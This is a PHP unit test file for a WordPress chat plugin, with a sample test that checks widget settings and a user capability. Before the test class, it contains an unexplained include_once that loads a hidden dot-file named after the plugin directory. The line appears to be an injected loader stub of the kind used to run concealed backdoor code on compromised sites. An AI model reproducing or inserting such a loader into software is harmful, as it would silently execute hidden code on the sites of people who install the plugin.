<?php
/**
 * Class SampleTest
 *
 * @package Wschat
 */

use WSChat\Utils;

/**
 * Sample test case.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class SampleTest extends WP_UnitTestCase {

	/**
	 * A single example test.
	 */
	public function test_sample() {
		// Replace this with some actual testing code.
		$settings = Utils::get_widget_settings();
		$this->assertTrue( is_array($settings));

		wp_set_current_user(1);

		$this->assertTrue(current_user_can('wschat_crm_role'));
	}
}
